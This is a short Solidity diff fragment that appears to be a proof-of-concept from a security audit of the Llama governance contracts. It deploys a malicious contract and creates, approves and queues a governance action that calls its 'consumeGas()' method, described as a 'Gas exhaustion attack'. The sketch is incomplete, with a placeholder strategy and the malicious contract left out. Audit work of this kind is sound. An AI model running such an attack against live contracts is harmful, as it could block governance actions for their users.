@@ -1,0 +1,14 @@
+address maliciousContractAddress = address(new MaliciousContract());
+ILlamaStrategy strategy = ...; // Get the strategy to be used
+uint256 value = 0; // Value to be sent with the action
+bytes memory data = abi.encodeWithSignature("consumeGas()"); // Method call data
+string memory description = "Gas exhaustion attack"; // Action description
+
+// Create the action
+uint256 actionId = llamaCore.createAction(msg.sender, role, strategy, maliciousContractAddress, value, data, description);
+
+// Approve the action
+llamaCore.castApproval(role, llamaCore.getAction(actionId), "Approving for gas exhaustion attack");
+
+// Queue the action for execution
+llamaCore.queueAction(llamaCore.getAction(actionId));
